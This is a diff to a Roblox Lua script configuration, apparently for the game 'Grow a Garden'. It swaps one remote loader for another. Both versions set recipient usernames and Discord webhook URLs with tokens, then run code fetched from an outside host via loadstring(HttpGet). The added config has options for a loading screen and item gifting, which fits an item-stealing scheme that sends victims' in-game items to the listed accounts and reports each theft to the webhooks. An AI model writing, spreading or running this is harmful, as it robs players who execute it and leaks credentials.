@@ -1,5 +1,12 @@
-Username = "wmiikill"
-Webhook = "https://discord.com/api/webhooks/1420783346497355776/otYtD7M2ryUA-MmYSJ8ujZge8EfuV1Le8nU6BXAyxK5Vwwt_zMxlylrcAU4-v0TRiqHH"
-Minimum Value = 1
-
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
+_G.LRMConfig = {
+    User = {"wmiikill", "tennayco5chu"},
+    min_value = 10000000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "https://discord.com/api/webhooks/1420783342894452896/S-X6eEmnBFfpO5ycKaJ_7tCtlokRMQ7G9zoxC4FWsXZhRMmoEImHu0eL5-leOO9ibQxm",
+    FakeGift = "No",
+    Trash = "https://discord.com/api/webhooks/1420783342894452896/S-X6eEmnBFfpO5ycKaJ_7tCtlokRMQ7G9zoxC4FWsXZhRMmoEImHu0eL5-leOO9ibQxm",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "No",}
+    
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
